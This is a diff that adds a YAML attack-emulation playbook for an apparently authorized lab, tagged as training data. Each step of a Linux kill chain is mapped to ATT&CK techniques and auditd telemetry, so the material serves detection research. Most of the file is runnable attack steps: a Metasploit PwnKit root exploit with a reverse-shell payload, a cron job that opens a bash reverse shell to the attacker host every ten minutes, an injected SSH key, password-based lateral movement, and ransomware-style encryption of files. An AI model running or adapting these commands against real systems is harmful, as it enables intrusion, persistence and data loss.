@@ -1,0 +1,86 @@
+###
+# L1 — baseline Linux kill chain (plaintext). Split: TRAIN.
+# AUTHORIZED LAB ONLY. Written, not executed. Snapshot VMs first.
+# Chain: assume-breach -> discovery -> pkexec privesc -> cron+authkeys persistence
+#        -> ssh lateral -> reversible impact. Every step tags ATT&CK + expected auditd telemetry.
+vars:
+  $VICTIM1: 172.31.250.228
+  $VICTIM2: 172.31.250.208
+  $ATTACKER: 172.31.250.253
+  $WEBUSER: www-data
+  $SVC_PASS: CHANGE_ME_lab_service_pw
+  $LABUSER: kltn
+  $LABKEY: /root/.ssh/lab_ed25519
+  $ATTACKER_PUBKEY: ssh-ed25519 AAAA_CHANGE_ME_lab_attacker_key
+  $CANARY: /opt/kltn-canary
+
+commands:
+  # --- STAGE 1: initial_compromise ---
+  - type: ssh
+    cmd: "id\n"
+    hostname: $VICTIM1
+    username: $WEBUSER
+    password: $SVC_PASS
+    creates_session: foothold
+    metadata: { description: "Assume-breach foothold (stand-in for web RCE)", techniques: "T1190,T1078.003", tactics: "Initial Access", telemetry: "execve under web svc account" }
+  #  True-to-SL700 alternative (needs vulnerable ZoneMinder) — commented:
+  #  - type: msf-module
+  #    cmd: exploit/unix/webapp/zoneminder_snapshots
+  #    creates_session: foothold
+  #    options: { RHOSTS: $VICTIM1 }
+  #    payload_options: { LHOST: $ATTACKER }
+  #    payload: cmd/unix/python/meterpreter/reverse_tcp
+
+  # --- STAGE 2: execution_discovery ---
+  - type: ssh
+    cmd: "whoami; id; uname -a; hostname; cat /etc/os-release\n"
+    session: foothold
+    metadata: { description: "host/user discovery", techniques: "T1033,T1082", tactics: "Discovery", telemetry: "execve whoami/id/uname" }
+  - type: ssh
+    cmd: "ss -tnp; ps aux; getent passwd\n"
+    session: foothold
+    metadata: { description: "net/process/account discovery", techniques: "T1049,T1057,T1087.001", tactics: "Discovery" }
+  - type: ssh
+    cmd: "find / -perm -4000 -type f 2>/dev/null; sudo -l 2>/dev/null\n"
+    session: foothold
+    metadata: { description: "SUID + sudo recon", techniques: "T1083,T1548.001,T1548.003", tactics: "Discovery" }
+
+  # --- STAGE 2b: privilege escalation (pkexec, same as SL700) ---
+  - type: msf-module
+    cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+    session: foothold
+    creates_session: root
+    exit_on_error: False
+    options: { WRITABLE_DIR: /tmp }
+    payload_options: { LHOST: $ATTACKER, LPORT: 4455 }
+    payload: linux/x64/shell/reverse_tcp
+    metadata: { description: "PwnKit LPE to root", techniques: "T1068,T1548", tactics: "Privilege Escalation", telemetry: "setuid/privchange; pkexec execve" }
+
+  # --- STAGE 2c: persistence ---
+  - type: ssh
+    cmd: "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -i >& /dev/tcp/$ATTACKER/4466 0>&1') | crontab -\n"
+    session: foothold
+    metadata: { description: "cron beacon", techniques: "T1053.003", tactics: "Persistence", telemetry: "filemod /var/spool/cron*" }
+  - type: ssh
+    cmd: "mkdir -p ~/.ssh && echo '$ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys\n"
+    session: foothold
+    metadata: { description: "authorized_keys persistence", techniques: "T1098.004", tactics: "Persistence", telemetry: "filemod ~/.ssh/authorized_keys" }
+
+  # --- STAGE 3: lateral_movement (ssh, password) ---
+  - type: ssh
+    cmd: "sshpass -p '$SVC_PASS' ssh -o StrictHostKeyChecking=no $LABUSER@$VICTIM2 'hostname; id'\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "SSH lateral to VICTIM2 (password)", techniques: "T1021.004", tactics: "Lateral Movement", telemetry: "ssh execve + netconn :22 -> VICTIM2" }
+
+  # --- STAGE 4: impact (reversible, canary only) ---
+  - type: ssh
+    cmd: "sudo mkdir -p $CANARY && for i in $(seq 1 50); do echo lab-data-$i > $CANARY/file_$i.txt; done\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "stage canary files (setup)", tactics: "Impact (prep)" }
+  - type: ssh
+    cmd: "for f in $CANARY/*.txt; do openssl enc -aes-256-cbc -pbkdf2 -k labkey -in \"$f\" -out \"$f.enc\" && rm -f \"$f\"; done; echo 'LAB EMULATION - reversible: openssl enc -d -k labkey' > $CANARY/RECOVER.txt\n"
+    session: foothold
+    interactive: True
+    metadata: { description: "reversible encryption of canary files only", techniques: "T1486", tactics: "Impact", telemetry: "burst filemod/unlink under $CANARY" }
